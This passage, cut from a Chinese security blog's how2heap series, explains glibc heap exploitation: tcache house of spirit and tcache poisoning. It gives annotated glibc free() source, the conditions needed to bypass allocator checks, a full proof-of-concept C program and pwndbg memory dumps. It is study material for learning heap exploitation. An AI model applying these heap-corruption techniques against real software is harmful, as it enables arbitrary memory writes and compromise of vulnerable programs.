title="free-__libc_free"></a>free-__libc_free</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">__libc_free (<span class="keyword">void</span> *mem)  <span class="comment">//传入要释放的指针所指向的地址：mem=0x7fffffffdd90</span></span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  mchunkptr p;                          <span class="comment">/* chunk corresponding to mem */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">void</span> (*hook) (<span class="keyword">void</span> *, <span class="keyword">const</span> <span class="keyword">void</span> *)</span><br><span class="line">    = atomic_forced_read (__free_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))   <span class="comment">//__free_hook</span></span><br><span class="line">    &#123;</span><br><span class="line">      (*hook)(mem, RETURN_ADDRESS (<span class="number">0</span>));</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (mem == <span class="number">0</span>)                              <span class="comment">/* free(0) has no effect */</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  p = mem2chunk (mem); <span class="comment">//转化为堆块的起始地址：p=0x7fffffffdd80</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (chunk_is_mmapped (p))  <span class="comment">//检查堆块是否由mmap分配：</span></span><br><span class="line">    &#123; <span class="comment">//mchunk_size==64==0x40==1000000（二进制）</span></span><br><span class="line">      <span class="comment">//#define chunk_is_mmapped(p) ((p)-&gt;mchunk_size &amp; IS_MMAPPED)==0</span></span><br><span class="line"><span class="meta">#mmap分配机制在这里先不研究，总之我们先要绕过这里进入_int_free函数</span></span><br><span class="line">      <span class="comment">//......(省略代码)</span></span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  MAYBE_INIT_TCACHE ();</span><br><span class="line"></span><br><span class="line">  ar_ptr = arena_for_chunk (p);</span><br><span class="line">  _int_free (ar_ptr, p, <span class="number">0</span>);  <span class="comment">//进入_int_free</span></span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (__libc_free)</span><br></pre></td></tr></table></figure><h3 id="free-int-free"><a href="#free-int-free" class="headerlink" title="free-_int_free"></a>free-_int_free</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   ------------------------------ free ------------------------------</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">_int_free (mstate av, mchunkptr p, <span class="keyword">int</span> have_lock)</span><br><span class="line">&#123; <span class="comment">//0x7ffff7dcdc40 &lt;main_arena&gt; p==0x7fffffffdd80 have_lock==0</span></span><br><span class="line"><span class="comment">//......(省略变量的定义)</span></span><br><span class="line"></span><br><span class="line">  size = chunksize (p); <span class="comment">//size==0x40</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Little security check which won&#x27;t hurt performance: the</span></span><br><span class="line"><span class="comment">     allocator never wrapps around at the end of the address space.</span></span><br><span class="line"><span class="comment">     Therefore we can exclude some size values which might appear</span></span><br><span class="line"><span class="comment">     here by accident or by &quot;design&quot; from some intruder.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect ((<span class="keyword">uintptr_t</span>) p &gt; (<span class="keyword">uintptr_t</span>) -size, <span class="number">0</span>)</span><br><span class="line">      || __builtin_expect (misaligned_chunk (p), <span class="number">0</span>))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;free(): invalid pointer&quot;</span>); <span class="comment">//检查堆指针是否有效</span></span><br><span class="line">    <span class="comment">//(uintptr_t) -size==0xffffffffffffffc0</span></span><br><span class="line">    <span class="comment">//    (uintptr_t) p==0x7fffffffdd80</span></span><br><span class="line">  <span class="comment">/* We know that each chunk is at least MINSIZE bytes in size or a</span></span><br><span class="line"><span class="comment">     multiple of MALLOC_ALIGNMENT.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (size &lt; MINSIZE || !aligned_OK (size)))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;free(): invalid size&quot;</span>);</span><br><span class="line">        <span class="comment">//检查p的大小是否有效:</span></span><br><span class="line">        <span class="comment">//1、堆块的大小不能小于最小分配大小</span></span><br><span class="line">        <span class="comment">//2、堆块的必须是MALLOC_ALIGN_MASK（堆块大小的最小对齐单位）的整数倍</span></span><br><span class="line"><span class="comment">//在这里MALLOC_ALIGN_MASK==0x10</span></span><br><span class="line">  check_inuse_chunk(av, p);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">size_t</span> tc_idx = csize2tidx (size); <span class="comment">//tc_idx==2</span></span><br><span class="line">    <span class="keyword">if</span> (tcache != <span class="literal">NULL</span> &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">      &#123;</span><br><span class="line"><span class="comment">/* Check to see if it&#x27;s already in the tcache.  */</span></span><br><span class="line">tcache_entry *e = (tcache_entry *) chunk2mem (p); <span class="comment">//检查tcache double free</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* This test succeeds on double free.  However, we don&#x27;t 100%</span></span><br><span class="line"><span class="comment">   trust it (it also matches random payload data at a 1 in</span></span><br><span class="line"><span class="comment">   2^&lt;size_t&gt; chance), so verify it&#x27;s not an unlikely</span></span><br><span class="line"><span class="comment">   coincidence before aborting.  */</span></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (e-&gt;key == tcache))</span><br><span class="line">  &#123;</span><br><span class="line">    tcache_entry *tmp;</span><br><span class="line">    LIBC_PROBE (memory_tcache_double_free, <span class="number">2</span>, e, tc_idx);</span><br><span class="line">    <span class="keyword">for</span> (tmp = tcache-&gt;entries[tc_idx];</span><br><span class="line"> tmp;</span><br><span class="line"> tmp = tmp-&gt;next)</span><br><span class="line">      <span class="keyword">if</span> (tmp == e)</span><br><span class="line">malloc_printerr (<span class="string">&quot;free(): double free detected in tcache 2&quot;</span>);</span><br><span class="line">    <span class="comment">/* If we get here, it was a coincidence.  We&#x27;ve wasted a</span></span><br><span class="line"><span class="comment">       few cycles, but don&#x27;t abort.  */</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)</span><br><span class="line">  &#123;</span><br><span class="line">    tcache_put (p, tc_idx); <span class="comment">//p==0x7fffffffdd80；tc_idx==2</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><h3 id="tcache-put"><a href="#tcache-put" class="headerlink" title="tcache_put"></a>tcache_put</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s room</span></span><br><span class="line"><span class="comment">   for more chunks.  */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> __always_inline <span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">tcache_put</span> <span class="params">(mchunkptr chunk, <span class="keyword">size_t</span> tc_idx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk); <span class="comment">//e=0x7fffffffdd90</span></span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will</span></span><br><span class="line"><span class="comment">  e-&gt;key = tcache;</span></span><br><span class="line"><span class="comment">     detect a double free.  */</span></span><br><span class="line"></span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>(uintptr_t) -size==0xffffffffffffffc0 可以将如下程序编译后从内存中得到：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">size_t</span> size=<span class="number">0x40</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%ld&quot;</span>,(<span class="keyword">uintptr_t</span>)-size);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>要想使用 tcache_house_of_spirit 这种攻击方式需要做到：</p><ol><li>有一个可控的指针，我们应将其的指向覆盖为 fake_chunks[]的地址；</li><li>堆块不能由 mmap 进行分配</li><li>堆块大小应该小于 tcachebin 的最大大小。</li><li>fake_chunks 的大小不能小于最小分配大小</li><li>fake_chunks 的大小必须是 MALLOC_ALIGN_MASK 的整数倍</li><li>fake_chunks 不能在 tcachebin 中形成 double free</li></ol><h1 id="一些疑问"><a href="#一些疑问" class="headerlink" title="一些疑问"></a>一些疑问</h1><h2 id="三个标志位"><a href="#三个标志位" class="headerlink" title="三个标志位"></a>三个标志位</h2><p>当我们将 fake_chunks_size 将 0x40 改为 0x41 后仍然可以绕过检查：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1619602275617-86703d7a-9e6c-4780-a061-4e35517e0059.png#clientId=uea3851af-3468-4&from=paste&height=403&id=u9213ef72&margin=%5Bobject%20Object%5D&name=image.png&originHeight=806&originWidth=2742&originalType=binary&size=246788&status=done&style=none&taskId=u5a35df86-d594-498a-a2f8-e150e597108&width=1371" alt="image.png"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;This chunk size has to be falling into the tcache category (chunk.size &lt;= 0x410; malloc arg &lt;= 0x408 on x64). The PREV_INUSE (lsb) bit is ignored by free for tcache chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \n&quot;</span>);</span><br><span class="line">fake_chunks[<span class="number">1</span>] = <span class="number">0x41</span>; <span class="comment">// 改为0x40</span></span><br></pre></td></tr></table></figure><p>我们仔细来研究一下，首先将 fake_chunks size 转化为二进制：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000000000000000000000000000000000001000001</span> #<span class="number">0x41</span>的二进制</span><br></pre></td></tr></table></figure><p>我们再来回顾一下 mchunk_size 中三个标志位的值：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PREV_INUSE 0x1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_MMAPPED 0x2</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NON_MAIN_ARENA 0x4</span></span><br></pre></td></tr></table></figure><p>将三个标志位的值分别转换为二进制：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PREV_INUSE     0x1==00000000000000000000000000000000000000000000001</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_MMAPPED     0x2==00000000000000000000000000000000000000000000010</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NON_MAIN_ARENA 0x4==00000000000000000000000000000000000000000000100</span></span><br></pre></td></tr></table></figure><p>很明显可以看到，0x41 这个 fake_chunks 中的 mchunk_size 中的 PREV_INUSE 已置位，这里再简单的说一下这三个标志位的功能：<br><code>A（NON_MAIN_ARENA）</code>：为 0 表示该 chunk 属于<strong>主分配区（主线程）</strong>，为 1 表示该 chunk 属于<strong>非主分配区（非主线程）。</strong><br><code>M（IS_MAPPED）</code>：表示当前 chunk 是从哪个内存区域获得的虚拟内存。为 1 表示该 chunk 是从<strong>mmap</strong>映射区域分配的，否则是从<strong>heap</strong>区域分配的。<br><code>P（PREV_INUSE）</code>：扩展的来讲就是 previous (chunk) inuse，它记录着前一个 chunk 的状态（malloc or free），其大小总是 2word 的倍数（1word = 2 byte），当 PREV_INUSE 为 1 时代表前一个 chunk 正处于 malloc 状态，free 则为 0（堆中第一个被分配的内存块的 size 字段的 P 位都会被设置为 1，以便于防止访问前面的非法内存）。当 PREV_INUSE 为 0 时，我们可以通过 prev_size 字段获取前一个 chunk 的大小及地址。因此我们不可以将任何 chunk 的 P 标志位随便进行设置，否则可能出现内存寻址错误。另外，在 fastbin 和 tcachebin 中虚拟空间内存相邻下一个堆块的 PREV_INUSE 总为 1。<br>这也就是为什么 0x40 和 0x41 这两个堆块的大小都可以，因为 P 标志位和 mmap 无关。</p><h2 id="内存对齐"><a href="#内存对齐" class="headerlink" title="内存对齐"></a>内存对齐</h2><p>但是还有一个疑问，为什么大小 0x41（65）会与 MALLOC_ALIGN_MASK(0x10、16)对齐？</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> aligned_OK(m)  (((unsigned long)(m) &amp; MALLOC_ALIGN_MASK) == 0)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MALLOC_ALIGN_MASK      (MALLOC_ALIGNMENT - 1)</span></span><br><span class="line"><span class="comment">//在此系统上，MALLOC_ALIGNMENT==0x10==16</span></span><br><span class="line"><span class="comment">//0x40==0x64</span></span><br></pre></td></tr></table></figure><p>我们容易将这里对齐的含义理解为数值上的整除，但是其实并不是这样，注意对齐的含义是与 MALLOC_ALIGN_MASK 进行“与运算”的结果为 0。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1619601118498-9cba6620-13de-4f1d-ab40-1966b501630a.png#clientId=ue06c2b55-916b-4&from=drop&id=u96c86042&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-04-28%2017.11.52.png&originHeight=244&originWidth=1410&originalType=binary&size=246828&status=done&style=none&taskId=u8ac940bc-7cf7-4fed-ad0c-b622967cbd3" alt="截屏2021-04-28 17.11.52.png"><br>只要结果为 0 即可绕过检查。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>how2heap(3)-tcache_poisoning</title>
    <link href="https://cyberangel.cn/2021/04/27/how2heap(3)-tcache_poisoning/"/>
    <id>https://cyberangel.cn/2021/04/27/how2heap(3)-tcache_poisoning/</id>
    <published>2021-04-27T00:05:07.000Z</published>
    <updated>2021-07-04T09:57:12.228Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>之前我们说过 tcache_poisoning 这种攻击方式：<br>这里再来简单的说一下，我们通过堆溢出或 UAF 修改 tcachebin 中的 free chunk 的 next 指针进而 malloc 申请控制任意内存的地址。当然 tcache_poisoning 和 fastbin 中修改 fd 指针的效果是一样的，但是所需要绕过的检查是不相同的，这里我们之后再说。</p><h1 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h1><p>所有启用 tcachebin 机制的 glibc malloc</p><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><h2 id="POC-glibc-2-27、glibc-2-29"><a href="#POC-glibc-2-27、glibc-2-29" class="headerlink" title="POC-glibc-2.27、glibc-2.29"></a>POC-glibc-2.27、glibc-2.29</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// disable buffering</span></span><br><span class="line">setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;This file demonstrates a simple tcache poisoning attack by tricking malloc into\n&quot;</span></span><br><span class="line">   <span class="string">&quot;returning a pointer to an arbitrary location (in this case, the stack).\n&quot;</span></span><br><span class="line">   <span class="string">&quot;The attack is very similar to fastbin corruption attack.\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;After the patch https://sourceware.org/git/?p=glibc.git;a=commit;h=77dc0d8643aa99c92bf671352b0a8adde705896f,\n&quot;</span></span><br><span class="line">   <span class="string">&quot;We have to create and free one more chunk for padding before fd pointer hijacking.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> stack_var;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;The address we want malloc() to return is %p.\n&quot;</span>, (<span class="keyword">char</span> *)&amp;stack_var);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Allocating 2 buffers.\n&quot;</span>);</span><br><span class="line"><span class="keyword">intptr_t</span> *a = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;malloc(128): %p\n&quot;</span>, a);</span><br><span class="line"><span class="keyword">intptr_t</span> *b = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;malloc(128): %p\n&quot;</span>, b);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Freeing the buffers...\n&quot;</span>);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"><span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now the tcache list has [ %p -&gt; %p ].\n&quot;</span>, b, a);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;We overwrite the first %lu bytes (fd/next pointer) of the data at %p\n&quot;</span></span><br><span class="line">   <span class="string">&quot;to point to the location to control (%p).\n&quot;</span>, <span class="keyword">sizeof</span>(<span class="keyword">intptr_t</span>), b, &amp;stack_var);</span><br><span class="line">b[<span class="number">0</span>] = (<span class="keyword">intptr_t</span>)&amp;stack_var;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now the tcache list has [ %p -&gt; %p ].\n&quot;</span>, b, &amp;stack_var);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;1st malloc(128): %p\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">128</span>));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now the tcache list has [ %p ].\n&quot;</span>, &amp;stack_var);</span><br><span class="line"></span><br><span class="line"><span class="keyword">intptr_t</span> *c = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;2nd malloc(128): %p\n&quot;</span>, c);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;We got the control\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">assert((<span class="keyword">long</span>)&amp;stack_var == (<span class="keyword">long</span>)c);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译之后我们来大致调试来看一下，我们对代码第 27 行下断点然后启动：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">120</span>gx <span class="number">0x555555757000</span></span><br><span class="line"><span class="number">0x555555757000</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000251</span> #tcache_perthread_struct</span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757250</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000091</span> <span class="meta">#a(malloc)</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x5555557572e0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000091</span> <span class="meta">#b(malloc)</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757370</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000020c91</span> #top_chunk</span><br><span class="line">......</span><br><span class="line"><span class="number">0x5555557573b0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>然后释放 a、b 这两个堆块：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">120</span>gx <span class="number">0x555555757000</span></span><br><span class="line"><span class="number">0x555555757000</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000251</span> #tcache_perthread_struct</span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757250</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000091</span> <span class="meta">#a(free)</span></span><br><span class="line"><span class="number">0x555555757260</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000555555757010</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x5555557572e0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000091</span> <span class="meta">#b(free)</span></span><br><span class="line"><span class="number">0x5555557572f0</span>:<span class="number">0x0000555555757260</span><span class="number">0x0000555555757010</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757370</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000020c91</span> #top_chunk</span><br><span class="line"><span class="number">0x5555557573b0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt; tcachebin</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0x90</span> [  <span class="number">2</span>]: <span class="number">0x5555557572f0</span> —▸ <span class="number">0x555555757260</span> ◂— <span class="number">0x0</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>然后我们修改 b 堆块的 next 指针 b[0] = (intptr_t)&amp;stack_var：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; tcachebin</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0x90</span> [  <span class="number">2</span>]: <span class="number">0x5555557572f0</span> —▸ <span class="number">0x7fffffffdd88</span> ◂— <span class="number">0x0</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>当我们再次申请两个堆块时即可控制任意内存：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;1st malloc(128): %p\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">128</span>));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now the tcache list has [ %p ].\n&quot;</span>, &amp;stack_var);</span><br><span class="line"></span><br><span class="line"><span class="keyword">intptr_t</span> *c = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br></pre></td></tr></table></figure><h1 id=""><a href="#" class="headerlink" title=""></a><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1619483439110-21dedbbf-dd96-4f47-8b48-826ec813d21b.png#clientId=u7e7751a1-2b6c-4&from=drop&id=u0e951888&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-04-27%2008.30.35.png&originHeight=130&originWidth=2202&originalType=binary&size=20640&status=done&style=none&taskId=u13a66ef3-a185-4755-bade-05b6b329127" alt="截屏2021-04-27 08.30.35.png"></h1><h2 id="malloc-源码说明"><a 